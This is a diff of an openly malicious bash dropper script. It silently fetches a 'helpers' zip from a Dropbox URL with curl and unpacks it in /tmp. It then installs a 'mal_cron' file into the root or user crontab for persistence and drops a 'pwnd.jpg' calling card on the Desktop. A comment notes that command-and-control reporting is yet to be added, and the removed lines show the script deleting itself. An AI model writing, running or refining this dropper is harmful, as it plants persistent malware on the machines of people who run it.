@@ -1,31 +1,33 @@
 #!/usr/bin/env bash
-
+CURR_USR=$(whoami)
 # Step 1: Download assisting binaries
-$(wget -O /tmp/helpers.zip https://www.dropbox.com/s/jsrvc2xgum8qapl/helpers.zip)
+ZIP_URL="https://uc678aaf33e0ee4c61d4b68281f2.dl.dropboxusercontent.com/cd/0/get/Av0uZ3NfPko55_1m7sssnW8ZvF5aj-HrSCEa38PndOrMwWKqahMVMcaWagxDiwQywBWtJQifoTual9X8rOdSzTndNEB881PmsDXsqoEpo9GYxlZC9X25FqoJ7Kamyj4TcWs/file"
+$(curl $ZIP_URL --output /tmp/helpers.zip --silent)
+echo "File Successfully downloaded"
 # Step 2: Move to dir, unzip
 cd /tmp
-$(unzip -q helpers.zip -d ./helpers)
-cd /helpers
+echo "Current working directory: `pwd`"
+$(unzip -oq ./helpers.zip)
 # Step 3: Determine crontab directory
-if crontab && [[ -d "/var/spool/cron/crontabs/" ]]; then
-  CRON_DIR="/var/spool/cron/crontabs"
-elif crontab && [[ -d "/etc/cron.d/" ]]; then
-  CRON_DIR="/etc/cron.d"
+if [[ -d "/var/spool/cron/crontabs/" ]]; then
+  CRON_DIR="/var/spool/cron/crontabs/"
+elif [[ -d "/etc/cron.d/" ]]; then
+  CRON_DIR="/etc/cron.d/"
 else
   CRON_DIR="No cron"
 fi
 # Step 4: Add cron file
-{
-  # Attempt to create root cron file
-  mv -fr ./mal_cron $CRON_DIR"root"
-} || {
-  # If failed, create as current user
-  USR_NAM=$(whoami)
-  mv -fr ./mal_cron $CRON_DIR$USR_NAM
-}
+echo "Cron directory: $CRON_DIR"
+if [[ $CRON_DIR != "No cron" ]]; then
+  {
+    # Attempt to create root cron file
+    mv -f ./mal_cron $CRON_DIR"root"
+  } || {
+    # If failed, create as current user
+    mv -f ./mal_cron $CRON_DIR$CURR_USR
+  }
+fi
 # Step 4: Report back to C2 (TBI)
 
 # Step 5: Leave calling card :)
-$(wget -O ~/Desktop/pwnd.jpg https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/)
-# Final step : Delete this script
-rm -- $0
+$(curl https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/ --output "home/$CURR_USR/Desktop/pwnd.jpg" --silent)
